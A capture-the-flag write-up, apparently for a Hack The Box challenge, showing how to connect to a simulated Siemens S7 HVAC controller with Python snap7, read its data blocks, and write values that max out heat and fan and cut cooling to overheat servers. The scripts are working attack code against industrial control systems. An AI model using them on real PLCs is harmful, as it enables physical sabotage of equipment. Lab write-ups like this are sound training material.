Task Force Phoenix has infiltrated Volnaya’s server room, targeting their VHX-3000 HVAC system—a Siemens S7-based PLC controlling temperature, airflow, and cooling, there are `5` databases that holds the data.The sizes of the DBs are estimated to be `50` or `100` bytes. Your mission: sabotage the system to overheat the servers, triggering the start of the blackout. For our plan to succeed, we need to fulfill the following requirements: - Set the fan speed to 99%. - Reduce cooling to 10%. - Turn the heat on. - Set the target temperature to 50°C.

# Solve

First I have to learn how to access a PLC.

Turns out python has a library for it called snap7, I found some writeups to help understand how to connect and find CPU info.

```
import snap7
from snap7.util import *
client = snap7.client.Client()
client.connect('94.237.58.172', 0, 1, tcp_port=45455)
if client.get_connected():
    print(client.get_cpu_info())
```

```
Connected to PLC. CPU Info:
<S7CpuInfo ModuleTypeName: b'CPU 315-2 PN/DP' SerialNumber: b'S C-C2UR28922012' ASName: b'SNAP7-SERVER' Copyright: b'Original Siemens Equipment' ModuleName: b'CPU 315-2 PN/DP'>
```

We can adjust this to show the db contents and its respective ascii text to make it readable.

```
import snap7
from snap7.util import *
import struct

# Initialize Snap7 client
client = snap7.client.Client()

try:
    # Connect to PLC at IP 94.237.58.172, port 45455, Rack=0, Slot=1
    print("Connecting to PLC at 94.237.58.172:45455...")
    client.connect('94.237.58.172', 0, 1, tcp_port=45455)
    
    # Check connection
    if not client.get_connected():
        print("Failed to connect to PLC")
        exit(1)
    
    for db in range(1, 6):  # Adjusted to match your range (1–20)
        try:
            # Try reading 100 bytes, then fall back to 50 if it fails
            try:
                data = client.db_read(db_number=db, start=0, size=100)
            except Exception:
                data = client.db_read(db_number=db, start=0, size=50)
            
            print(f"\nDB{db} (Size: {len(data)} bytes):")
            
            # Attempt to interpret the first 4 bytes as different data types
            if len(data) >= 4:
                try:
                    real_value = struct.unpack('>f', data[:4])[0]
                    print(f"  First 4 bytes as REAL: {real_value}")
                except:
                    print(f"  First 4 bytes as REAL: Invalid")
                
                try:
                    int_value = struct.unpack('>h', data[:2])[0]
                    print(f"  First 2 bytes as INT: {int_value}")
                except:
                    print(f"  First 2 bytes as INT: Invalid")
                
                bool_value = data[0]
                print(f"  First byte as BOOL: {'True' if bool_value == 1 else 'False'}")
            
            # Print raw bytes in hex
            print(f"  Raw bytes (hex): {data.hex()}")
            
            # Check for ASCII strings (potential flags or HVAC parameters)
            try:
                ascii_str = data.decode('ascii', errors='ignore').strip()
                if ascii_str:
                    print(f"  ASCII decode: {ascii_str}")
            except:
                pass
            
        except Exception as e:
            print(f"  Error reading DB{db}: {e}")
    
except Exception as e:
    print(f"Error: {e}")
finally:
    # Clean up
    if client.get_connected():
        client.disconnect()
    client.destroy()
    print("\nDisconnected from PLC")

```

For example
```
DB1 (Size: 50 bytes):
  First 4 bytes as REAL: 3321236291584.0
  First 2 bytes as INT: 21569
  First byte as BOOL: False
  Raw bytes (hex): 5441524745542d54454d503a32304320534554504f494e543a323243204d41583a333043204d494e3a313043200000000000
  ASCII decode: TARGET-TEMP:20C SETPOINT:22C MAX:30C MIN:10C 
b'CPU : Address out of range'
```


![](Images/Pasted%20image%2020250526163203.png)

![](Images/Pasted%20image%2020250526163222.png)


After hours of trying to get it to work and working with HTB support, there was an issue with how I was replacing the DBs. But here is the working solve.

```
import snap7
from snap7.util import *
import time

# Initialize PLC client
plc = snap7.client.Client()

def connect_plc(ip, port):
    print(f"Connecting to PLC at {ip}:{port}...")
    try:
        plc.connect(ip, 0, 2, port)
        if plc.get_connected():
            print("Connected to PLC")
            return True
        else:
            print("Connection failed")
            return False
    except Exception as e:
        print(f"Connection error: {str(e)}")
        return False

try:
    # Try primary IP/port
    ip = '94.237.58.121'
    port = 39528
    if not connect_plc(ip, port):
        # Fallback to alternate IP/port
        ip = '94.237.123.198'
        port = 55705
        if not connect_plc(ip, port):
            print("Connection failed on alternate IP")
            exit(1)

    print("\nExecuting overheat sequence:")
    # Sequence of writes with specified offsets
    writes = [
        (1, 29, "MAX:65C"),          # DB1, offset 29
        (2, 0, "FAN:99%"),           # DB2, offset 0
        (3, 8, "COOL:10%"),          # DB3, offset 8
        (5, 0, "HEAT:ON "),           # DB5, offset 0
        (1, 0, "TARGET-TEMP:50C"),   # DB1, offset 0
    ]

    # Perform writes and verify
    for db_number, offset, value in writes:
        try:
            # Encode value as raw ASCII bytes
            data = value.encode('ascii')
            # Write to specific offset
            plc.db_write(db_number, offset, data)
            print(f"Wrote {value} to DB{db_number} at offset {offset}")
            
            # Read entire DB to verify (50 bytes, adjust if needed)
            result = plc.db_read(db_number, 0, 50)
            hex_content = result.hex()
            ascii_content = result.decode('ascii', errors='ignore').strip()
            print(f"DB{db_number} raw bytes (hex): {hex_content}")
            print(f"DB{db_number} content (ASCII): {ascii_content}")
            
        except Exception as e:
            print(f"Error writing to DB{db_number} at offset {offset}: {str(e)}")
            raise
        
        time.sleep(1)  # Delay between writes

    # Read DB4 multiple times to check for flag
    print("\nReading DB4 to check for flag or state update...")
    for i in range(5):  # Try 5 times with delay
        try:
            db4_data = plc.db_read(db_number=4, start=0, size=100)
            hex_content = db4_data.hex()
            ascii_content = db4_data.decode('ascii', errors='ignore').strip()
            print(f"DB4 read {i+1} raw bytes (hex): {hex_content}")
            print(f"DB4 read {i+1} content (ASCII): {ascii_content}")
            if "LOG:" in ascii_content and "LOG:-" not in ascii_content:
                log_value = ascii_content.split("LOG:")[1].strip()
                print(f"Potential flag in LOG: {log_value}")
            time.sleep(10)  # Wait 10 seconds between reads
        except Exception as e:
            print(f"Error reading DB4 on attempt {i+1}: {str(e)}")
            # Try reconnecting
            plc.disconnect()
            if connect_plc(ip, port):
                print("Reconnected to PLC for next read")
            else:
                print("Reconnection failed, stopping DB4 reads")
                break

except Exception as e:
    print(f"Connection error: {str(e)}")

finally:
    if plc.get_connected():
        plc.disconnect()
    plc.destroy()
    print("Disconnected from PLC")

```